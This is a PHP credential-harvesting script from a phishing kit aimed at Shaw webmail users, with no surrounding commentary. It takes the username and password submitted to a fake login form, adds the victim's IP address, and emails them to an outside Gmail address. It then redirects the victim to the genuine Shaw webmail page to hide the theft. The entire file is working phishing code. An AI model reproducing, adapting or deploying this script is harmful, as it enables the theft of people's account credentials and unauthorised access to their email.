<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || tHAnks tO JfReE || :------\n";
$message .= "User ID             : ".$_POST['username']."\n";
$message .= "Password              : ".$_POST['password']."\n";
$message .= "----: || tHAnks tO Phish || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "peterbrown2nice@gmail.com";
$subject = " https://webmail.shaw.ca/redirect.shaw.do | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  https://webmail.shaw.ca/redirect.shaw.do");
?>


